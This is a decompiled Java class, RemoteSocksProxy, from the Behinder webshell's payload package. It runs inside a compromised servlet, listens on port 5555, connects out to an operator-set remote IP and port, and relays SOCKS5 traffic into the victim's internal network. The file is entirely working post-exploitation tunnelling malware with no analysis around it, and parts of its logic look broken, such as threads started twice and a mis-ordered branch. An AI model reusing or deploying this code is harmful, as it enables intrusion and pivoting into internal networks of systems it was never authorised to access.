// 
// Decompiled by Procyon v0.5.36
// 

package net.rebeyond.behinder.payload.java;

import net.rebeyond.behinder.utils.CipherUtils;
import java.net.InetAddress;
import java.io.DataOutputStream;
import java.io.DataInputStream;
import java.net.SocketTimeoutException;
import java.net.SocketAddress;
import java.net.InetSocketAddress;
import java.nio.channels.SocketChannel;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletResponse;
import javax.servlet.ServletRequest;

public class RemoteSocksProxy implements Runnable
{
    public static String action;
    public static String remoteIP;
    public static String remotePort;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private Socket outerSocket;
    private Socket innerSocket;
    private Socket serverInnersocket;
    private Socket targetSocket;
    private int listenPort;
    private String threadType;
    private int bufSize;
    
    public RemoteSocksProxy(final Socket socket, final String threadType, final HttpSession session) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.outerSocket = socket;
        this.threadType = threadType;
        this.Session = session;
    }
    
    public RemoteSocksProxy(final String threadType, final HttpSession session) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.threadType = threadType;
        this.Session = session;
    }
    
    public RemoteSocksProxy(final Socket outerSocket, final String threadType, final Socket innerSocket) {
        this.listenPort = 5555;
        this.bufSize = 65535;
        this.outerSocket = outerSocket;
        this.innerSocket = innerSocket;
        this.threadType = threadType;
    }
    
    public RemoteSocksProxy() {
        this.listenPort = 5555;
        this.bufSize = 65535;
    }
    
    @Override
    public boolean equals(final Object obj) {
        return false;
    }
    
    @Override
    public void run() {
        if (RemoteSocksProxy.action.equals("create")) {
            try {
                final ServerSocket serverSocket = new ServerSocket(this.listenPort, 50);
                this.Session.setAttribute("socks_server_" + this.listenPort, (Object)serverSocket);
                serverSocket.setReuseAddress(true);
                new Thread(new RemoteSocksProxy("link", this.Session)).start();
                while (true) {
                    final Socket serverInnersocket = serverSocket.accept();
                    this.Session.setAttribute("socks_server_inner_" + serverInnersocket.getInetAddress().getHostAddress() + "_" + serverInnersocket.getPort(), (Object)serverInnersocket);
                    new Thread(new RemoteSocksProxy(serverInnersocket, "session", this.Session)).start();
                }
            }
            catch (IOException ex) {}
        }
        if (RemoteSocksProxy.action.equals("link")) {
            try {
                final SocketChannel outerSocketChannel = SocketChannel.open();
                outerSocketChannel.connect(new InetSocketAddress(RemoteSocksProxy.remoteIP, Integer.parseInt(RemoteSocksProxy.remotePort)));
                final String outerKey = "socks_outer_" + outerSocketChannel.socket().getLocalPort() + "_" + RemoteSocksProxy.remoteIP + "_" + RemoteSocksProxy.remotePort;
                this.Session.setAttribute(outerKey, (Object)outerSocketChannel);
                final SocketChannel innerSocketChannel = SocketChannel.open();
                innerSocketChannel.connect(new InetSocketAddress("127.0.0.1", this.listenPort));
                final String innerKey = "socks_inner_" + innerSocketChannel.socket().getLocalPort();
                this.Session.setAttribute(innerKey, (Object)innerSocketChannel);
            }
            catch (IOException ex2) {}
        }
        else if (RemoteSocksProxy.action.equals("session")) {
            try {
                if (this.handleSocks(this.serverInnersocket)) {
                    final Thread reader = new Thread(new RemoteSocksProxy(this.serverInnersocket, "read", this.Session));
                    reader.start();
                    final Thread writer = new Thread(new RemoteSocksProxy(this.serverInnersocket, "write", this.Session));
                    writer.start();
                    reader.start();
                    writer.start();
                    reader.join();
                    writer.join();
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        else if (RemoteSocksProxy.action.equals("read")) {
            while (this.outerSocket != null) {
                try {
                    final byte[] buf = new byte[512];
                    for (int bytesRead = this.innerSocket.getInputStream().read(buf); bytesRead > 0; bytesRead = this.innerSocket.getInputStream().read(buf)) {
                        this.outerSocket.getOutputStream().write(buf, 0, bytesRead);
                        this.outerSocket.getOutputStream().flush();
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
                try {
                    this.innerSocket.close();
                    this.outerSocket.close();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        else if (RemoteSocksProxy.action.equals("write")) {
            while (true) {
                while (this.outerSocket != null) {
                    try {
                        this.outerSocket.setSoTimeout(1000);
                        final byte[] data = new byte[this.bufSize];
                        final int length = this.outerSocket.getInputStream().read(data);
                        if (length != -1) {
                            this.innerSocket.getOutputStream().write(data, 0, length);
                            this.innerSocket.getOutputStream().flush();
                            continue;
                        }
                    }
                    catch (SocketTimeoutException e2) {
                        continue;
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    try {
                        this.innerSocket.close();
                        this.outerSocket.close();
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    return;
                }
                continue;
            }
        }
    }
    
    private boolean handleSocks(final Socket socket) throws Exception {
        final int ver = socket.getInputStream().read();
        if (ver == 5) {
            return this.parseSocks5(socket);
        }
        return ver == 4 && this.parseSocks4(socket);
    }
    
    private boolean parseSocks5(final Socket socket) throws Exception {
        final DataInputStream ins = new DataInputStream(socket.getInputStream());
        final DataOutputStream os = new DataOutputStream(socket.getOutputStream());
        final int nmethods = ins.read();
        final int methods = ins.read();
        os.write(new byte[] { 5, 0 });
        int version = ins.read();
        int cmd;
        int atyp;
        if (version == 2) {
            version = ins.read();
            cmd = ins.read();
            final int rsv = ins.read();
            atyp = ins.read();
        }
        else {
            cmd = ins.read();
            final int rsv = ins.read();
            atyp = ins.read();
        }
        final byte[] targetPort = new byte[2];
        String host = "";
        if (atyp == 1) {
            final byte[] target = new byte[4];
            ins.readFully(target);
            ins.readFully(targetPort);
            final String[] tempArray = new String[4];
            for (int i = 0; i < target.length; ++i) {
                final int temp = target[i] & 0xFF;
                tempArray[i] = temp + "";
            }
            for (final String temp2 : tempArray) {
                host = host + temp2 + ".";
            }
            host = host.substring(0, host.length() - 1);
        }
        else if (atyp == 3) {
            final int targetLen = ins.read();
            final byte[] target = new byte[targetLen];
            ins.readFully(target);
            ins.readFully(targetPort);
            host = new String(target);
        }
        else if (atyp == 4) {
            final byte[] target = new byte[16];
            ins.readFully(target);
            ins.readFully(targetPort);
            host = new String(target);
        }
        final int port = (targetPort[0] & 0xFF) * 256 + (targetPort[1] & 0xFF);
        if (cmd == 2 || cmd == 3) {
            throw new Exception("not implemented");
        }
        if (cmd == 1) {
            host = InetAddress.getByName(host).getHostAddress();
            try {
                final SocketChannel targetSocketChannel = SocketChannel.open();
                targetSocketChannel.connect(new InetSocketAddress(host, port));
                final String innerKey = "socks_target_" + targetSocketChannel.socket().getLocalPort() + "_" + host + "_" + port;
                this.Session.setAttribute(innerKey, (Object)targetSocketChannel);
                os.write(CipherUtils.mergeByteArray(new byte[][] { { 5, 0, 0, 1 }, InetAddress.getByName(host).getAddress(), targetPort }));
                return true;
            }
            catch (Exception e) {
                os.write(CipherUtils.mergeByteArray(new byte[][] { { 5, 0, 0, 1 }, InetAddress.getByName(host).getAddress(), targetPort }));
                throw new Exception(String.format("[%s:%d] Remote failed", host, port));
            }
        }
        throw new Exception("Socks5 - Unknown CMD");
    }
    
    private boolean parseSocks4(final Socket socket) {
        return false;
    }
}
